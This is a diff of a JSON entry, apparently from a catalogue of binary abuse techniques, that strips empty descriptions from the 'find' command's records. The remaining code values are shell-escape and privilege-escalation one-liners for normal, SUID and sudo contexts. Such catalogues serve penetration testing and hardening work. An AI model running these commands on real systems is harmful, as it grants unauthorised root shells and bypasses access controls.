@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "find . -exec /bin/sh \\; -quit\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./find . -exec /bin/sh -p \\; -quit\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo find . -exec /bin/sh \\; -quit\n"
       }
     ],
